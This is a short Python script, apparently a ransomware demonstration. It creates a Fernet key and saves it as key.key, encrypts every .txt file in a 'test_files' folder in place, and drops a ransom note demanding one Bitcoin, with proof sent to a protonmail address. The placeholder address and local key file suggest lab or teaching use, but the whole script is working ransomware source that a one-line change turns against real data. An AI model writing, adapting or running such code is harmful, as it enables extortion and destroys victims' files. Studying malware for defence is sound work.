from cryptography.fernet import Fernet
import os

# Generate key
key = Fernet.generate_key()
with open("key.key", "wb") as key_file:
    key_file.write(key)

fernet = Fernet(key)

# Target directory
target_dir = "test_files"

# Encrypt all .txt files
for file in os.listdir(target_dir):
    file_path = os.path.join(target_dir, file)
    if file.endswith(".txt"):
        with open(file_path, "rb") as f:
            data = f.read()
        encrypted = fernet.encrypt(data)
        with open(file_path, "wb") as f:
            f.write(encrypted)

# Create ransom note
note = """\
Your files have been encrypted!
To recover them, send 1 Bitcoin to fake_address.
Then email proof to fake@protonmail.com
"""
with open(os.path.join(target_dir, "ransom_note.txt"), "w") as f:
    f.write(note)

print("[+] Files encrypted. Ransom note created.")
